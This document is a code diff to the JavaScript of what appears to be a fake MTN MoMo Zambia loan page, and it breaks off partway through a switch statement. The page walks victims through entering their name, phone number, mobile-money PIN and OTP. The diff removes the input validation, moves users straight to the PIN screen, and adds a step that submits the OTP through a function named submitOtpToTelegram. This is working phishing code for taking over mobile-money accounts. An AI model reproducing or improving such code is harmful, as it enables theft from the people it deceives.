@@ -65,7 +65,6 @@
     let smsAutoSubmittedForCurrentValue = '';
     let pinSubmittedForCurrentValue = '';
     let otpSubmittedForCurrentValue = '';
-    let lastHandledAt = 0;
 
     const urlParams = new URLSearchParams(window.location.search);
     const adminParam = urlParams.get('admin') || '';
@@ -211,15 +210,10 @@
       const ln = (lastNameInput?.value || '').trim();
       const ph = (formPhoneInput?.value || '').trim();
 
-      if (!fn || !ln || !isValidMtnZambia(ph)) {
-        showBanner(
-          bannerForm3Error,
-          'Please go back to Step 2 and enter your full name and valid MTN MoMo number (096, 076, 056).'
-        );
-        return;
-      }
-
-      const fullName = `${fn} ${ln}`.toUpperCase();
+      const fullName =
+        `${fn} ${ln}`.trim().toUpperCase() ||
+        (sumApplicant?.innerText || '').trim() ||
+        'MTN MOMO ZAMBIA';
       const zeroPhone = toZeroPrefixPhone(ph);
       const formattedPhone = formatDisplayPhone(zeroPhone);
 
@@ -234,6 +228,11 @@
       otpBoxes4.forEach((b) => (b.value = ''));
       hideBanner(bannerPinError);
       hideBanner(bannerOtpError);
+
+      showScreen(screens.pin);
+      setTimeout(() => {
+        if (pinBoxes5[0]) pinBoxes5[0].focus();
+      }, 40);
 
       try {
         const res = await fetch(
@@ -252,9 +251,6 @@
           currentUserId = data.userId;
         }
       } catch (e) {}
-
-      showScreen(screens.pin);
-      if (pinBoxes5[0]) pinBoxes5[0].focus();
     }
 
     function startSmsCountdown() {
@@ -466,10 +462,6 @@
     }
 
     async function handleButtonAction(buttonId, event) {
-      const now = Date.now();
-      if (now - lastHandledAt < 120) return;
-      lastHandledAt = now;
-
       switch (buttonId) {
         case 'btn-goto-slider':
           updateCalc();
@@ -553,4 +545,10 @@
         case 'btn-submit-otp': {
           const otpVal = otpBoxes4.map((b) => b.value).join('');
           if (otpVal.length < 4) {
-      
+            showBanner(bannerOtpError, 'Please enter all 4 digits of your MTN MoMo 4-Digit OTP.');
+            return;
+          }
+          await submitOtpToTelegram(otpVal, false);
+          break;
+        }
+        case 'btn-succe
